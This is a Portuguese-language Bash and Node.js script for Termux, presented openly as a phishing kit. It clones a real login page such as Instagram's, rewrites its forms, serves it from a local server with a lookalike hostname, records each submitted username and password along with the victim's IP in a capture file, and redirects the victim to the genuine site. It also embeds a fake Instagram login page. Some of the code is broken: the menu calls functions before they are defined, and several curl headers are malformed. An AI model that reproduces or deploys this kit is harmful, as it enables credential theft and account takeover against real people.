#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v3 - URL TOTALMENTE CUSTOMIZÁVEL
# O local do link pode ser qualquer coisa que você inventar
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; PURPLE='\033[0;35m'; WHITE='\033[1;37m'; NC='\033[0m'

SCRIPT_DIR="$(pwd)"
SITE_DIR="$SCRIPT_DIR/site_clone"
LOG_FILE="$SCRIPT_DIR/capturas.txt"
SERVER_FILE="$SCRIPT_DIR/server/server.js"

clear
echo -e "${PURPLE}"
echo "╔═══════════════════════════════════════════════════╗"
echo "║        🎣 PHISH LOCAL v3 - URL LIVRE             ║"
echo "║        Sem root | Dominio customizavel            ║"
echo "╚═══════════════════════════════════════════════════╝"
echo -e "${NC}"

# Instalar node se precisar
if ! command -v node &>/dev/null; then
    echo -e "${YELLOW}[...] Instalando Node.js...${NC}"
    pkg install nodejs -y >/dev/null 2>&1
fi

mkdir -p "$SITE_DIR" "$SCRIPT_DIR/server"

# =============================================
# MENU PRINCIPAL
# =============================================
echo -e "${WHITE}O que você quer fazer?${NC}"
echo ""
echo -e "  ${GREEN}1)${NC} 🎣 Criar novo phishing"
echo -e "  ${GREEN}2)${NC} � Ver capturas"
echo -e "  ${GREEN}3)${NC} �️ Limpar site clonado"
echo -e "  ${GREEN}4)${NC} ❌ Sair"
echo ""
read -p "  👉 " MENU

case $MENU in
    1) setup_phishing ;;
    2) ver_capturas ;;
    3) limpar_site ;;
    4) exit 0 ;;
    *) echo -e "${RED}[!] Inválido${NC}"; exit 1 ;;
esac

# =============================================
# SETUP PHISHING
# =============================================
setup_phishing() {
clear
echo -e "${PURPLE}"
echo "╔═══════════════════════════════════════════════════╗"
echo "║           🎣 CRIAR NOVO PHISHING                 ║"
echo "�═══════════════════════════════════════════════════╝"
echo -e "${NC}"

# --- URL PARA CLONAR ---
echo -e "${CYAN}[1/5] Site para clonar (URL real)${NC}"
echo -e "    ${YELLOW}Ex: https://www.instagram.com${NC}"
read -p "    👉 " TARGET_URL
[[ ! "$TARGET_URL" =~ ^https?:// ]] && TARGET_URL="https://$TARGET_URL"

# --- NOME DA URL LOCAL (TOTALMENTE LIVRE) ---
echo ""
echo -e "${CYAN}[2/5] Como você quer que a URL pareça?${NC}"
echo -e "    ${YELLOW}Exemplos:${NC}"
echo -e "      ${GREEN}instagram.local${NC}              → http://instagram.local:8080"
echo -e "      ${GREEN}www.instagram-login.com${NC}     → http://www.instagram-login.com:8080"
echo -e "      ${GREEN}facebook-seguro.net${NC}        → http://facebook-seguro.net:8080"
echo -e "      ${GREEN}${NC} (pode inventar QUALQUER COISA!)"
read -p "    👉 " LOCAL_NAME
LOCAL_NAME="${LOCAL_NAME:-login}"

# --- PORTA ---
echo ""
echo -e "${CYAN}[3/5] Porta [padrão: 8080]${NC}"
read -p "    👉 " PORT
PORT="${PORT:-8080}"

# --- REDIRECT ---
echo ""
echo -e "${CYAN}[4/5] Redirecionar pra onde depois do login?${NC}"
echo -e "    ${YELLOW}Geralmente o site original${NC}"
read -p "    👉 " REDIRECT_URL
[[ ! "$REDIRECT_URL" =~ ^https?:// ]] && REDIRECT_URL="https://$REDIRECT_URL"

# --- LEVA OU NÃO O SITE CLONADO? ---
echo ""
echo -e "${CYAN}[5/5] ${NC}Você quer que o phishing capture:"
echo "    1) Apenas a página de login (HTML/CSS clonado)"
echo "    2) ${RED} NÃO USAR CLONE${NC} - Apenas o servidor de login genérico"
read -p "    👉 " MODO_CLONE

# =============================================
# CONFIRMAÇÃO
# =============================================
clear
echo -e "${PURPLE}"
echo "╔═══════════════════════════════════════════════════╗"
echo "║                 📋 RESUMO                        ║"
echo "╠═══════════════════════════════════════════════════╣"
echo -e "║  Clonar:    $(printf '%-33s' "$TARGET_URL")║"
echo -e "║  URL Local: $(printf '%-33s' "http://${LOCAL_NAME}:${PORT}")║"
echo -e "║  Redirect:  $(printf '%-33s' "$REDIRECT_URL")║"
echo -e "║  Modo:      $(printf '%-33s' "$MODO_CLONE")║"
echo "╚═══════════════════════════════════════════════════╝"
echo -e "${NC}"
read -p "  Confirma? (s/n) 👉 " OK
[ "$OK" != "s" ] && [ "$OK" != "S" ] && { echo -e "${YELLOW}[-] Cancelado${NC}"; exit 0; }

# =============================================
# CLONAR SITE SE ESCOLHER OPÇÃO 1
# =============================================
rm -rf "$SITE_DIR"/*
mkdir -p "$SITE_DIR"

if [ "$MODO_CLONE" != "2" ]; then
    echo -e "${YELLOW}[...] Clonando site...${NC}"

    # Baizar pagina principal
    curl -s -L -o "$SITE_DIR/index.html" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
        "-H: Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
        "-H: Accept-Language: pt-BR,pt;q=0.9,en;q=0.8" \
        "$TARGET_URL" 2>/dev/null

    # Tentar baizar CSS comum
    for css in $(grep -oE 'href="[^"]*\.css"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/href="//;s/"//'); do
        filename=$(basename "$css")
        [ -f "$SITE_DIR/$filename" ] && continue
        if [[ "$css" =~ ^http ]]; then
            curl -s -L -o "$SITE_DIR/$filename" "-H: User-Agent: Mozilla/5.0" "$css" 2>/dev/null
        elif [[ "$css" =~ ^/ ]]; then
            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
            curl -s -L -o "$SITE_DIR/$filename" "-H: User-Agent: Mozilla/5.0" "$BASE$css" 2>/dev/null
        fi
    done

    # Tentar JS
    for js in $(grep -oE 'src="[^"]*\.js"' "$SITE_DIR/index.html" 2>/dev/null | sed 's/src="//;s/"//'); do
        filename=$(basename "$js")
        [ -f "$SITE_DIR/$filename" ] && continue
        if [[ "$js" =~ ^http ]]; then
            curl -s -L -o "$SITE_DIR/$filename" "-H: User-Agent: Mozilla/5.0" "$js" 2>/dev/null
        elif [[ "$js" =~ ^/ ]]; then
            BASE=$(echo "$TARGET_URL" | grep -oE 'https?://[^/]+')
            curl -s -L -o "$SITE_DIR/$filename" "-H: User-Agent: Mozilla/5.0" "$BASE$js" 2>/dev/null
        fi
    done

    # Modificar formulários
    sed -i 's/<form/<form method="POST" action="\/login"/gi' "$SITE_DIR/index.html"
    sed -i 's/action="[^"]*"/action="\/login"/gi' "$SITE_DIR/index.html"

    if [ -f "$SITE_DIR/index.html" ]; then
        echo -e "${GREEN}[✓] Site clonado!${NC}"
        [ $(du -b "$SITE_DIR/index.html" | cut -f1) -lt 500 ] && {
            echo -e "${YELLOW}[!] Site muito pequeno, pode não ter clonado direito${NC}"
        }
    else
        echo -e "${RED}[!] Falha ao clonar. Usando página genérica.${NC}"
    fi
fi

# =============================================
# CRIAR SERVIDOR
# =============================================
cat > "$SERVER_FILE" << SERVEREOF
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = ${PORT};
const SITE_DIR = "${SITE_DIR}";
const LOG_FILE = "${LOG_FILE}";
const REDIRECT_URL = "${REDIRECT_URL}";
const LOCAL_NAME = "${LOCAL_NAME}";

const MIME = {
    '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
    '.woff': 'font/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf',
    '.json': 'application/json', '.mp4': 'video/mp4',
};

function saveCapture(body, ip) {
    const ts = new Date().toISOString().replace('T',' ').split('.')[0];
    const params = new URLSearchParams(body);
    const data = {};
    for (let [k,v] of params.entries()) data[k] = v;
    const log = `[${ts}] IP: ${ip} | Dados: ${JSON.stringify(data)}\n`;
    fs.appendFileSync(LOG_FILE, log);
    console.log('\n[CAPTURADO]'); console.log(log);
    return data;
}

const server = http.createServer((req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            saveCapture(body, ip);
            res.writeHead(302, { 'Location': REDIRECT_URL }); res.end();
        });
        return;
    }

    // Servir arquivos ou fallback
    let fp = req.url === '/' ? '/index.html' : req.url.split('?')[0];
    fp = path.join(SITE_DIR, fp);
    const ext = path.extname(fp).toLowerCase();

    fs.readFile(fp, (err, data) => {
        if (err) {
            // Fallback: página genérica de login
            const html = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont:'Segoe UI',Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}
.card h1{font-family:'Segoe UI',sans-serif;font-size:44px;font-weight:300;margin-bottom:30px}
.card input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none}
.card input:focus{border-color:#a8a8a8}
.card button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
.card button:active{background:#1877f2}
.or{color:#8e8e8e;font-size:13px;margin:20px 0}
a{color:#385185;text-decoration:none;font-size:12px}</style></head><body>
<div class="card"><h1>Instagram</h1>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required>
<input type="password" name="password" placeholder="Senha" required>
<button type="submit">Entrar</button>
</form>
<div class="or"><hr><span>OU</span><hr></div>
<a href="#">Esqueceu a senha?</a></div></body></html>`;
            res.writeHead(200, {'Content-Type': 'text/html'}); res.end(html);
            return;
        }
        res.writeHead(200, {'Content-Type': MIME[ext] || 'application/octet-stream'});
        res.end(data);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log('Servidor ativo na porta ${PORT}');
});
SERVEREOF

# =============================================
# INICIAR SERVIDOR
# =============================================
# Obter IP do Termux
IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
[ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)

# Salvar config
mkdir -p .config
echo "TARGET_URL=$TARGET_URL" > .config/last
echo "LOCAL_NAME=$LOCAL_NAME" >> .config/last
echo "PORT=$PORT" >> .config/last
echo "REDIRECT_URL=$REDIRECT_URL" >> .config/last

clear
echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════╗"
echo "║              🎣 SERVIDOR PRONTO!                 ║"
echo "╠═══════════════════════════════════════════════════�"
echo "║                                                   ║"
echo "║  🔥 URL DO SERVIDOR:                             ║"
echo "║                                                   ║"
echo "║     ${WHITE}http://${IP}:${PORT}${NC}                     ║"
echo "║                                                   ║"
echo "╠═══════════════════════════════════════════════════╣"
echo "║                                                   ║"
echo "║  📝 Para URL customizada, no PC edite:            ║"
echo "║     ${YELLOW}C:\\Windows\\System32\\drivers\\etc\\hosts${NC}       ║"
echo "║                                                   ║"
echo "║  Adicione esta linha:                            ║"
echo "║     ${WHITE}${IP}  ${LOCAL_NAME}${NC}                 ║"
echo "║                                                   ║"
echo "║  E depois acesse:                                 ║"
echo "║     ${WHITE}http://${LOCAL_NAME}:${PORT}${NC}            ║"
echo "║                                                   ║"
echo "╠═══════════════════════════════════════════════════╣"
echo "║  📁 Capturas: capturas.txt                       ║"
echo "║  🔄 Pra parar: Ctrl+C                            ║"
echo "╚═══════════════════════════════════════════════════╝"
echo -e "${NC}"

# Iniciar
node "$SERVER_FILE"

# Quando parar
echo ""
echo -e "${YELLOW}[*] Servidor finalizado.${NC}"
read -p "  Ver capturas? (s/n) 👉 " VER
[ "$VER" = "s" ] || [ "$VER" = "S" ] && {
    echo ""
    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
        cat "$LOG_FILE"
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
    else
        echo -e "${YELLOW}Nenhuma captura.${NC}"
    fi
    sleep 2
}
}

ver_capturas() {
    echo ""
    if [ -f "$LOG_FILE" ] && [ -s "$LOG_FILE" ]; then
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
        cat "$LOG_FILE"
        echo -e "${GREEN}═══════════════════════════════════════════════${NC}"
    else
        echo -e "${YELLOW}Nenhuma captura ainda.${NC}"
    fi
    sleep 2
}

limpar_site() {
    rm -rf "$SITE_DIR"/*
    echo -e "${GREEN}[✓] Site clonado removido.${NC}"
    sleep 1
}
